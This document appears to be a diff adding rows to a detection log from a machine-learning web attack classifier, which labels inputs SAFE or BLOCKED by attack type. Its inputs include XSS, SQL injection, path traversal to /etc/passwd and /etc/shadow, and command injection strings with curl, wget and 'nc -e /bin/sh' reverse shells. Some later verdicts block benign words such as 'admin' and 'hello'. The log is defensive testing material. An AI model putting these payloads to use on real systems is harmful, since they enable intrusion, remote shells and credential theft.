+",Random Forest,1,XSS,0.7943
+2026-02-02T18:38:38.481881,"<body onload=alert('gopiI')>,1
+",ANN,1,XSS,0.9678
+2026-02-02T18:38:51.148568,"<body onload=alert('PghatI')>,1
+",Logistic Regression,1,XSS,0.7179
+2026-02-02T18:38:51.149247,"<body onload=alert('PghatI')>,1
+",SVM,1,XSS,0.9685
+2026-02-02T18:38:51.149885,"<body onload=alert('PghatI')>,1
+",Random Forest,1,XSS,0.7943
+2026-02-02T18:38:51.150423,"<body onload=alert('PghatI')>,1
+",ANN,1,XSS,0.9678
+2026-02-02T18:39:05.785780," OR uhu0L7IAbiwc --,2
+",Logistic Regression,2,SQL Injection,0.8042
+2026-02-02T18:39:05.786422," OR uhu0L7IAbiwc --,2
+",SVM,2,SQL Injection,0.9676
+2026-02-02T18:39:05.786843," OR uhu0L7IAbiwc --,2
+",Random Forest,2,SQL Injection,0.7849
+2026-02-02T18:39:05.787227," OR uhu0L7IAbiwc --,2
+",ANN,2,SQL Injection,0.9624
+2026-02-07T07:02:33.236444,"ghgjhgjhfh
+",Logistic Regression,0,Safe,0.9743
+2026-02-07T07:02:33.237658,"ghgjhgjhfh
+",SVM,0,Safe,0.9979
+2026-02-07T07:02:33.238198,"ghgjhgjhfh
+",Random Forest,0,Safe,0.9989
+2026-02-07T07:02:33.238681,"ghgjhgjhfh
+",ANN,0,Safe,0.9990
+2026-02-07T07:02:53.889387,"gopitilak789@gmail.com
+",Logistic Regression,0,Safe,0.9984
+2026-02-07T07:02:53.890242,"gopitilak789@gmail.com
+",SVM,0,Safe,0.9992
+2026-02-07T07:02:53.890960,"gopitilak789@gmail.com
+",Random Forest,0,Safe,1.0000
+2026-02-07T07:02:53.891422,"gopitilak789@gmail.com
+",ANN,0,Safe,1.0000
+2026-02-07T07:03:21.377610,"search=gcwiub param660,0
+",Logistic Regression,0,Safe,0.9964
+2026-02-07T07:03:21.378548,"search=gcwiub param660,0
+",SVM,0,Safe,0.9979
+2026-02-07T07:03:21.379067,"search=gcwiub param660,0
+",Random Forest,0,Safe,1.0000
+2026-02-07T07:03:21.379662,"search=gcwiub param660,0
+",ANN,0,Safe,1.0000
+2026-02-07T07:03:42.981170,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",",Logistic Regression,2,SQL Injection,0.8984
+2026-02-07T07:03:42.982047,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",",SVM,2,SQL Injection,0.9677
+2026-02-07T07:03:42.982720,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",",Random Forest,2,SQL Injection,0.9521
+2026-02-07T07:03:42.983222,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",",ANN,2,SQL Injection,0.9981
+2026-02-08T20:10:05.093634,sample@gmail.com,Logistic Regression,0,Safe,0.9984
+2026-02-08T20:10:05.094862,sample@gmail.com,SVM,0,Safe,0.9992
+2026-02-08T20:10:05.095443,sample@gmail.com,Random Forest,0,Safe,1.0000
+2026-02-08T20:10:05.095826,sample@gmail.com,ANN,0,Safe,1.0000
+2026-02-08T20:13:17.942642,=.dsvbh,Logistic Regression,0,Safe,0.9743
+2026-02-08T20:13:17.943387,=.dsvbh,SVM,0,Safe,0.9979
+2026-02-08T20:13:17.944051,=.dsvbh,Random Forest,0,Safe,0.9989
+2026-02-08T20:13:17.944595,=.dsvbh,ANN,0,Safe,0.9990
+2026-02-08T20:13:36.671996,"<body onload=prompt('vdbv8z')> param969,1
+",Logistic Regression,1,XSS,0.8769
+2026-02-08T20:13:36.672780,"<body onload=prompt('vdbv8z')> param969,1
+",SVM,1,XSS,0.9686
+2026-02-08T20:13:36.673302,"<body onload=prompt('vdbv8z')> param969,1
+",Random Forest,1,XSS,0.9162
+2026-02-08T20:13:36.673686,"<body onload=prompt('vdbv8z')> param969,1
+",ANN,1,XSS,0.9985
+2026-02-08T20:14:52.064412,""" UNION SELECT 5in6FN,fLGEte FROM bY0SO0 --"",2
+",Logistic Regression,2,SQL Injection,0.8763
+2026-02-08T20:14:52.065294,""" UNION SELECT 5in6FN,fLGEte FROM bY0SO0 --"",2
+",SVM,2,SQL Injection,0.9677
+2026-02-08T20:14:52.066033,""" UNION SELECT 5in6FN,fLGEte FROM bY0SO0 --"",2
+",Random Forest,2,SQL Injection,0.8587
+2026-02-08T20:14:52.066558,""" UNION SELECT 5in6FN,fLGEte FROM bY0SO0 --"",2
+",ANN,2,SQL Injection,0.9708
+2026-02-08T20:15:05.201835,"sdnjbkvl,0",Logistic Regression,0,Safe,0.9743
+2026-02-08T20:15:05.202790,"sdnjbkvl,0",SVM,0,Safe,0.9979
+2026-02-08T20:15:05.203378,"sdnjbkvl,0",Random Forest,0,Safe,0.9989
+2026-02-08T20:15:05.203880,"sdnjbkvl,0",ANN,0,Safe,0.9990
+2026-02-08T20:15:15.450858,"adfvadfb,=,3",Logistic Regression,0,Safe,0.9743
+2026-02-08T20:15:15.451780,"adfvadfb,=,3",SVM,0,Safe,0.9979
+2026-02-08T20:15:15.452549,"adfvadfb,=,3",Random Forest,0,Safe,0.9989
+2026-02-08T20:15:15.453240,"adfvadfb,=,3",ANN,0,Safe,0.9990
+2026-02-08T20:15:32.475027,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",
+",Logistic Regression,2,SQL Injection,0.8984
+2026-02-08T20:15:32.475772,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",
+",SVM,2,SQL Injection,0.9677
+2026-02-08T20:15:32.476425,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",
+",Random Forest,2,SQL Injection,0.9521
+2026-02-08T20:15:32.477197,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",
+",ANN,2,SQL Injection,0.9981
+2026-02-08T20:15:42.750022,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",0
+",Logistic Regression,2,SQL Injection,0.8984
+2026-02-08T20:15:42.750972,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",0
+",SVM,2,SQL Injection,0.9677
+2026-02-08T20:15:42.751684,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",0
+",Random Forest,2,SQL Injection,0.9521
+2026-02-08T20:15:42.752466,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",0
+",ANN,2,SQL Injection,0.9981
+2026-02-09T04:15:42.050074,akhil,Logistic Regression,0,Safe,0.9743
+2026-02-09T04:15:42.051305,akhil,SVM,0,Safe,0.9979
+2026-02-09T04:15:42.051915,akhil,Random Forest,0,Safe,0.9989
+2026-02-09T04:15:42.052398,akhil,ANN,0,Safe,0.9990
+2026-02-09T05:39:12.599294,hgfxggn,Logistic Regression,0,Safe,0.9743
+2026-02-09T05:39:12.600493,hgfxggn,SVM,0,Safe,0.9979
+2026-02-09T05:39:12.600998,hgfxggn,Random Forest,0,Safe,0.9989
+2026-02-09T05:39:12.601495,hgfxggn,ANN,0,Safe,0.9990
+2026-02-10T12:57:52.567663,"' OR 1=1 --
+",BLOCKED,SQL Injection,0.9500,WEB
+2026-02-10T12:58:08.064985,"' OR 1=1 --
+",BLOCKED,SQL Injection,0.9500,WEB
+2026-02-10T12:58:11.393812,"' OR 1=1 --
+",BLOCKED,SQL Injection,0.9500,WEB
+2026-02-10T13:01:31.671572,"' OR 1=1 --
+",BLOCKED,SQL Injection,0.9500,WEB
+2026-02-10T13:02:12.100781,"' OR 1=1 --
+",BLOCKED,SQL Injection,0.9500,WEB
+2026-02-10T13:03:45.282647,"../../etc/passwd
+",BLOCKED,Path Traversal,0.9400,WEB
+2026-02-10T13:21:24.302086,' OR 1=1 --,BLOCKED,SQL Injection,0.9500,WEB
+2026-02-10T13:21:34.204450,../../etc/passwd,BLOCKED,Path Traversal,0.9400,WEB
+2026-02-11T04:47:14.014287,hello world,SAFE,None,0.9990,WEB
+2026-02-11T04:47:38.019012,""" UNION SELECT frq0HG,KxpaAN FROM zvi3Rm -- param95"",2
+",BLOCKED,SQL Injection,0.9981,WEB
+2026-02-11T04:48:37.778302,../../etc/passwd,BLOCKED,Path Traversal,1.0000,WEB
+2026-02-11T04:49:18.764716,hello world,SAFE,None,0.9990,WEB
+2026-02-11T04:49:42.864206,hello world,SAFE,None,0.9990,WEB
+2026-02-11T04:49:52.061297,shashank reddy ,SAFE,None,0.9990,WEB
+2026-02-11T04:56:19.578311,shashank,SAFE,None,0.9990,WEB
+2026-02-11T04:57:04.976388,1=1,SAFE,None,0.9990,WEB
+2026-02-11T04:57:15.591768,shasha,SAFE,None,0.9990,WEB
+2026-02-11T04:57:24.990870,gopi@mail.com,SAFE,None,1.0000,WEB
+2026-02-11T04:59:32.784646,"<img src=x onerror=confirm('kaod1R')> param481,1
+",BLOCKED,XSS,0.9962,WEB
+2026-02-11T05:09:25.478346,"""' UNION SELECT vnfKj1,k8dxmH FROM AdcPCF --"",2
+",BLOCKED,SQL Injection,0.9708,WEB
+2026-02-11T07:09:16.904925,"comment=nice product edkvoj param175,0",SAFE,None,1.0000
+2026-02-11T07:09:30.825083,"AND 8NSgZ9eQ85KE --,2",BLOCKED,SQL Injection,0.9671
+2026-02-11T07:11:09.643584,dvadfs,SAFE,None,0.9990
+2026-02-11T07:11:20.430094,"AND 8NSgZ9eQ85KE --,2",BLOCKED,SQL Injection,0.9671
+2026-02-11T07:15:12.713436,1' OR '1'='1,BLOCKED,SQL Injection,0.9671
+2026-02-11T07:15:13.787990,1' OR '1'='1,BLOCKED,SQL Injection,0.9671
+2026-02-11T07:15:51.233313,hello this is a normal message,SAFE,None,0.9990
+2026-02-11T07:20:16.706542,"<img src=x onerror=alert('Bruq3j')>,1",BLOCKED,XSS,0.9689
+2026-02-11T07:22:26.406738,zbsfdb,SAFE,None,0.9990
+2026-02-11T07:26:14.239859,sfgbaed,SAFE,None,0.9990
+2026-02-11T07:26:24.260823,1' OR '1'='1,BLOCKED,SQL Injection,0.9671
+2026-02-11T07:30:01.612357,<script>alert(1)</script>,BLOCKED,XSS,0.9695
+2026-02-11T07:30:43.639854,<script>alert(1)</script>,BLOCKED,XSS,0.9695
+2026-02-11T07:31:04.257745,sbdfbaedta,SAFE,None,0.9990
+2026-02-11T07:39:57.684989,shashnak,SAFE,None,0.9990
+2026-02-11T07:40:03.254924,dfhaete,SAFE,None,0.9990
+2026-02-11T07:40:10.784393,dhrthaerh,SAFE,None,0.9990
+2026-02-11T07:40:22.648717,"OR tSW48pdZsBGp --,2",BLOCKED,SQL Injection,0.9671
+2026-02-11T09:12:13.576774,"<script>confirm('3wg1Oi')</script>,1",BLOCKED,XSS,0.9992
+2026-02-11T09:12:52.941205,fsdhgdfn,SAFE,None,0.9990
+2026-02-11 14:49:30,dbfdf,SAFE,SAFE,0.0000
+2026-02-11 14:49:44,"username=loaqke&password=wqttcksu,0",SAFE,SAFE,0.0000
+2026-02-11 14:49:49,"username=loaqke&password=wqttcksu,0",SAFE,SAFE,0.0000
+2026-02-11 14:50:06,"searchndyhit,0",SAFE,SAFE,0.0000
+2026-02-11 14:50:13,"<script>alert('csBOXS')</script>,1",BLOCKED,XSS,0.9695
+2026-02-11 14:57:13,aregear,SAFE,SAFE,0.0000
+2026-02-11 14:57:26,"<svg onload=prompt('jyEZiH')> param247,1",BLOCKED,XSS,0.9993
+2026-02-11 14:59:44,"OR m8svOIaufIlN --,2",BLOCKED,SQL Injection,0.9671
+2026-02-11 15:08:43,"OR 9aVMjuMIw8BX -- param492,2",BLOCKED,SQL Injection,0.9995
+2026-02-11 15:25:48,"' AND MQ8dvQ=tGzKwq --,2",BLOCKED,SQL Injection,0.9671
+2026-02-11 15:26:13,"' AND MQ8dvQ=tGzKwq --,2",BLOCKED,SQL Injection,0.9671
+2026-02-11 15:26:40,dvgqergq,SAFE,SAFE,0.0000
+2026-02-11 15:27:04,"../../../../application.properties,3",BLOCKED,Path Traversal,0.9930
+2026-02-11 15:27:32,"../../../../application.properties,3",BLOCKED,Path Traversal,0.9930
+2026-02-11 15:28:04,../../../../application.propertie,SAFE,SAFE,0.0000
+2026-02-11 15:28:15,../../../../application.properties,BLOCKED,Path Traversal,0.9930
+2026-02-13 19:00:15,"shahsa ,k",SAFE,SAFE,0.0000
+2026-02-13 19:00:34,latha@gmail.com,SAFE,SAFE,0.0000
+2026-02-13 19:00:51,"<img srcx onerroralert(WZGPw1)> param578,",BLOCKED,XSS,0.9987
+2026-02-13 19:02:47,"OR sJAC5W LIKE glRqf8 -- param905,2",BLOCKED,SQL Injection,0.9995
+2026-02-13 19:03:02,"' OR 6TGht3 LIKE 'cm76ae' --,2",BLOCKED,SQL Injection,0.9671
+2026-02-18 11:00:24,"search=pmtuip,0",SAFE,SAFE,0.0000
+2026-02-18 11:00:43,"<svg onloadalert(dj9jdh)>,1",BLOCKED,XSS,0.9689
+2026-02-18 11:16:54,latha madam,SAFE,SAFE,0.0000
+2026-02-18 11:17:09,"<svg onloadalert(dj9jdh)>,1",BLOCKED,XSS,0.9689
+2026-02-18 11:17:19,"<svg onloadalert(dj9jdh)>,1",BLOCKED,XSS,0.9689
+2026-02-19 19:41:44,KWEGFLIU,SAFE,SAFE,0.0000
+2026-02-19 19:41:56,"=1.,198hhbdvskhb",SAFE,SAFE,0.0000
+2026-02-19 19:42:33,"' OR 'Y79PW8'='iqFoo7' --,2",BLOCKED,SQL Injection,0.9671
+2026-02-19 20:03:26,search=iitzda,SAFE,SAFE,1.0000
+2026-02-19 20:03:33,<svg onload=confirm('mAYmK3')>,BLOCKED,XSS,0.9762
+2026-02-19 20:04:44,../../../../etc/passwd,BLOCKED,Path Traversal,1.0000
+2026-02-19 20:06:27,comment=nice product kwvyqj,SAFE,SAFE,1.0000
+2026-02-19 20:06:32,' OR 't1Q9cM'='oWbgch' --,BLOCKED,SQL Injection,0.9671
+2026-02-19 20:13:20,comment=nice product ikulsk,SAFE,SAFE,1.0000
+2026-02-19 20:13:33,../../web.xml,BLOCKED,Path Traversal,1.0000
+2026-02-19 20:16:38,search=rcvkzg,SAFE,SAFE,1.0000
+2026-02-19 20:16:48,../../../boot.ini,BLOCKED,Path Traversal,1.0000
+2026-02-19 20:17:19,"' UNION SELECT qWOdrf,nXFTja FROM E0pml6 --",BLOCKED,SQL Injection,0.9708
+2026-02-19 20:18:00,<svg onload=alert('RuFPpU')>,BLOCKED,XSS,0.9689
+2026-02-19 20:18:25,' OR 'nKjDAb'='ppGmFF' --,BLOCKED,SQL Injection,0.9671
+2026-02-19 20:18:33,../../../../../../../var/log/auth.log,BLOCKED,Path Traversal,1.0000
+2026-02-19 20:18:34,../../../../../../../var/log/auth.log,BLOCKED,Path Traversal,1.0000
+2026-02-19 20:18:55,id=4920,SAFE,SAFE,1.0000
+2026-02-19 20:18:58,"' UNION SELECT Uhv99z,TzRMLX FROM wy0gKa --",BLOCKED,SQL Injection,0.9708
+2026-02-19 20:19:35,' OR 'VtcN11'='QFFJrk' --,BLOCKED,SQL Injection,0.9671
+2026-02-19 20:19:47,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/config%2ephp,BLOCKED,Path Traversal,0.9846
+2026-02-19 20:19:50,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/config%2ephp,BLOCKED,Path Traversal,0.9846
+2026-02-19 20:21:07,<svg onload=alert('XQLx5P')>,BLOCKED,XSS,0.9689
+2026-02-19 20:23:40,email=upzsbh@gmail.com,SAFE,SAFE,1.0000
+2026-02-19 20:23:43,email=upzsbh@gmail.com,SAFE,SAFE,1.0000
+2026-02-19 20:23:50,<img src=x onerror=confirm('wVVcw9')>,BLOCKED,XSS,0.9689
+2026-02-19 20:28:06,email=zkwybr@gmail.com,SAFE,SAFE,1.0000
+2026-02-19 20:28:13,../../windows/system.ini,BLOCKED,Path Traversal,1.0000
+2026-02-19 20:28:24,' OR 'wAJgLK'='OsybTD' --,BLOCKED,SQL Injection,0.9671
+2026-02-19 20:28:31,<img src=x onerror=prompt('omLjiP')>,BLOCKED,XSS,0.9689
+2026-02-19 20:28:47,username=mrlfcj&password=uakxurof,SAFE,SAFE,1.0000
+2026-02-19 20:29:30,username=mogqlv&password=bwdctgkn,SAFE,SAFE,1.0000
+2026-02-19 20:29:40,' OR hXjSPb LIKE 'CT5z5e' --,BLOCKED,SQL Injection,0.9671
+2026-03-03 19:25:33,<svg onload=alert('nsbssB')>,BLOCKED,XSS,1.0000
+2026-03-03 19:25:37,id=55,SAFE,SAFE,1.0000
+2026-03-03 19:25:45,; curl http://rOm2Oj,BLOCKED,Command Injection,1.0000
+2026-03-03 19:26:17,"' UNION SELECT OkSU7h,x3qxNG FROM LfIc5F --",BLOCKED,SQL Injection,1.0000
+2026-03-03 19:26:23,"' UNION SELECT OkSU7h,x3qxNG FROM LfIcF --",BLOCKED,SQL Injection,1.0000
+2026-03-03 19:26:29,"' UNION SELECT OkSU7h,x3qxNG FROM",BLOCKED,SQL Injection,1.0000
+2026-03-03 19:26:37,<body onload=c,BLOCKED,XSS,0.9971
+2026-03-03 19:26:40,$(wget http://egrWDu),BLOCKED,Command Injection,1.0000
+2026-03-03 19:26:42,comment=nice product brgexm,SAFE,SAFE,1.0000
+2026-03-03 19:26:45,comment=nice product,SAFE,SAFE,1.0000
+2026-03-03 19:26:54,&& curl http://HqHEBB,BLOCKED,Command Injection,1.0000
+2026-03-03 19:26:57,<body onload=confirm('pMxuko')>,BLOCKED,XSS,1.0000
+2026-03-03 19:27:07,<script>alert('AYC8bO')</script>,BLOCKED,XSS,1.0000
+2026-03-03 19:32:14,"' UNION SELECT dcRmwM,lzkQFJ FROM t4BKJa --",BLOCKED,SQL Injection,1.0000
+2026-03-03 19:33:16,username=neaqfb&password=wnqoodbf,SAFE,SAFE,1.0000
+2026-03-03 19:33:22,|| wget http://FJzVHV,BLOCKED,Command Injection,1.0000
+2026-03-03 19:33:27,|| wget http://FJzV,BLOCKED,Command Injection,1.0000
+2026-03-03 19:33:37,../../etc/passwd,BLOCKED,Path Traversal,1.0000
+2026-03-03 19:38:44,' AND VCUeu5=7WgscK --,BLOCKED,SQL Injection,1.0000
+2026-03-03 19:38:47,username=broiep&password=dctgqsmr,SAFE,SAFE,1.0000
+2026-03-03 19:42:57,%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot%2eini,BLOCKED,Path Traversal,1.0000
+2026-03-03 19:43:03,%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot%2ei,BLOCKED,Path Traversal,1.0000
+2026-03-03 19:43:13,shashank,SAFE,SAFE,0.8101
+2026-03-03 19:47:21,5566,SAFE,SAFE,0.8101
+2026-03-03 19:47:30,edrfgksfjkbsrjknfbs,SAFE,SAFE,0.8101
+2026-03-03 19:47:45,"<img src=x onerror=prompt('D5GNzJ')>,1",BLOCKED,XSS,1.0000
+2026-03-03 19:53:06,"""<script>confirm('3wg1Oi')</script>,",BLOCKED,XSS,1.0000
+2026-03-03 23:16:28,3333,SAFE,SAFE,0.5723
+2026-03-03 23:16:41,3333,SAFE,SAFE,0.5723
+2026-03-03 23:18:49,3333,SAFE,SAFE,0.9967
+2026-03-03 23:21:02,3333,BLOCKED,Path Traversal,0.9694
+2026-03-03 23:24:38,3333,BLOCKED,Path Traversal,0.9694
+2026-03-03 23:24:49,1111,BLOCKED,SQL Injection,0.6757
+2026-03-03 23:24:57,1234,BLOCKED,SQL Injection,0.6757
+2026-03-03 23:25:04,srihari,BLOCKED,SQL Injection,0.6757
+2026-03-03 23:25:11,srihari,BLOCKED,SQL Injection,0.6757
+2026-03-03 23:25:41,srihari,BLOCKED,SQL Injection,0.6757
+2026-03-03 23:30:27,3333,BLOCKED,Path Traversal,0.9561
+2026-03-03 23:30:33,srihari,BLOCKED,SQL Injection,0.6757
+2026-03-03 23:31:03,hari,BLOCKED,SQL Injection,0.6757
+2026-03-03 23:31:09,hello,BLOCKED,SQL Injection,0.6757
+2026-03-03 23:31:19,comment=nice product oyuzqx,SAFE,SAFE,1.0000
+2026-03-03 23:31:42,"search=gugsdz
+id=2849",SAFE,SAFE,1.0000
+2026-03-03 23:31:45,id=2849,SAFE,SAFE,1.0000
+2026-03-03 23:31:59,"id=2849
+&& cat /etc/shadow",BLOCKED,Command Injection,0.9765
+2026-03-03 23:32:10,"&& cat /etc/shadow
+id=2849",BLOCKED,Command Injection,0.9765
+2026-03-03 23:39:16,; nc -e /bin/sh aulrDC wXn734,BLOCKED,Command Injection,1.0000
+2026-03-03 23:39:19,%2e%2e/boot%2eini,BLOCKED,Path Traversal,0.9973
+2026-03-03 23:39:21,<script>alert('ddhOqo')</script>,BLOCKED,XSS,1.0000
+2026-03-03 23:39:23,' OR 3A73TN LIKE 'fD6pak' --,BLOCKED,SQL Injection,1.0000
+2026-03-03 23:39:25,search=bxmgzh,SAFE,SAFE,1.0000
+2026-03-03 23:39:30,username=oxtulb&password=pljcecja,SAFE,SAFE,1.0000
+2026-03-03 23:39:31,search=sctied,SAFE,SAFE,1.0000
+2026-03-03 23:39:37,he;,BLOCKED,SQL Injection,0.6757
+2026-03-03 23:40:03,comment=nice product pmhadd,SAFE,SAFE,1.0000
+2026-03-03 23:40:24,"2026-03-03 23:40:03,comment=nice product pmhadd,SAFE,SAFE,1.0000",SAFE,SAFE,1.0000
+2026-03-04 10:00:49,%2e%2e/etc/passwd,BLOCKED,Path Traversal,1.0000
+2026-03-04 10:00:51,%2e%2e/etc/passwd,BLOCKED,Path Traversal,1.0000
+2026-03-04 10:00:52,|| ping -c 4 LIBRzB,BLOCKED,Command Injection,1.0000
+2026-03-04 10:00:52,& curl http://oWuecq,BLOCKED,Command Injection,1.0000
+2026-03-04 10:00:53,username=suhcdp&password=qcdozxae,SAFE,SAFE,1.0000
+2026-03-04 10:00:54,email=lvaipx@gmail.com,SAFE,SAFE,1.0000
+2026-03-04 10:02:37,<svg onload=confirm('5jvt1n')>,BLOCKED,XSS,1.0000
+2026-03-04 10:02:38,| nc -e /bin/sh 8iVuTE mdkJYK,BLOCKED,Command Injection,1.0000
+2026-03-04 10:02:39,username=egysxk&password=jfcdyans,SAFE,SAFE,1.0000
+2026-03-04 10:02:43,` nc -e /bin/sh gYVTe0 uo4aTo,BLOCKED,Command Injection,1.0000
+2026-03-04 18:49:56,' OR m9fNMj LIKE '1jVH5E' --,BLOCKED,SQL Injection,1.0000
+2026-03-04 18:50:01,|| nc -e /bin/sh g7N5qT AOOyfP,BLOCKED,Command Injection,1.0000
+2026-03-04 18:50:08,jhsdbfgbskfgb,BLOCKED,SQL Injection,0.6757
+2026-03-04 18:50:11,comment=nice product baueyf,SAFE,SAFE,1.0000
+2026-03-04 18:50:15,comment=nice product baueyf,SAFE,SAFE,1.0000
+2026-03-04 18:50:54,..//..//..//..//..//..//config.php,BLOCKED,Path Traversal,1.0000
+2026-03-04 18:50:57,username=wgnhoo&password=anyikhye,SAFE,SAFE,1.0000
+2026-03-04 18:51:55,username=wgnhoo&password=anyikhye,BLOCKED,Path Traversal,0.9592
+2026-03-04 21:28:05,' AND sVUV1N=2ZHuMt --,BLOCKED,SQL Injection,1.0000
+2026-03-04 21:28:54,testuser,BLOCKED,Path Traversal,0.6021
+2026-03-04 21:34:34,safe_user,BLOCKED,Path Traversal,0.6021
+2026-03-04 21:36:16,testuser,BLOCKED,Path Traversal,0.6021
+2026-03-04 21:36:28,hello,BLOCKED,Path Traversal,0.6021
+2026-03-04 21:37:30,admin ,BLOCKED,Path Traversal,0.6021
+2026-03-04 21:38:03,admin ,BLOCKED,Path Traversal,0.6021
+2026-03-04 21:38:23,safe_user,BLOCKED,Path Traversal,0.6021
+2026-03-04 21:54:05,admin ,BLOCKED,Path Traversal,0.6021
+2026-03-04 22:01:11,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,BLOCKED,Path Traversal,1.0000
+2026-03-04 22:01:12,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,BLOCKED,Path Traversal,1.0000
+2026-03-04 22:01:25,safe_user,BLOCKED,Path Traversal,0.6021
+2026-03-04 22:01:42,admin ,BLOCKED,Path Traversal,0.6021
+2026-03-04 22:01:59,admin,BLOCKED,Path Traversal,0.6021
+2026-03-04 22:02:21,admin,BLOCKED,Path Traversal,0.6021
+2026-03-04 22:54:22,' OR pIaAoF LIKE 'UHTRZR' --,BLOCKED,SQL Injection,1.0000
+2026-03-04 22:54:28,' OR pIaAoF LIKE 'UHTRZR' --,BLOCKED,SQL Injection,1.0000
+2026-03-04 22:54:38,' OR pIaAoF LIKE 'UHTRZR' --,BLOCKED,SQL Injection,1.0000
